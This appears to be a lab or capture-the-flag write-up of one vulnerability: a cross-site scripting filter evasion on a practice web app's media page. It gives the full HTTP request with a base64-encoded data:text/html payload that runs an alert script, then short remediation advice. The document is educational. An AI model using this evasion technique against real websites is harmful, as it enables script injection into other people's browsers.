Vulterability 12
------

Type: `xss filter evasion` :   

Request page : `http://10.11.200.146/?page=media`   

Request media page with xss filter evasion:
```
GET http://10.11.200.146/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydChPTUcgVEhJUyBJUyBJTlNBTkUpPC9zY3JpcHQ+ HTTP/1.1
Host: 10.11.200.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: I_am_admin=68934a3e9455fa72420237eb05902327
Connection: keep-alive
Upgrade-Insecure-Requests: 
```

URLs prefixed with the data: scheme, allow content creators to embed small files inline in documents.
Defaults is text/plain, we set it to text/html in order to execute our java script code 

There is also a filter evasion. We need to encode our `<script>alert()</script>`, luckly you can specify base64 to embed base64-encoded binary data : 
```
base64,PHNjcmlwdD5hbGVydChPTUcgVEhJUyBJUyBJTlNBTkUpPC9zY3JpcHQ+
```
We had this to our initial request and the `alert()` is executed.

### Resolv ?
- Never Insert Untrusted Data Except in Allowed Locations
- HTML and javascript Escape Before Inserting data
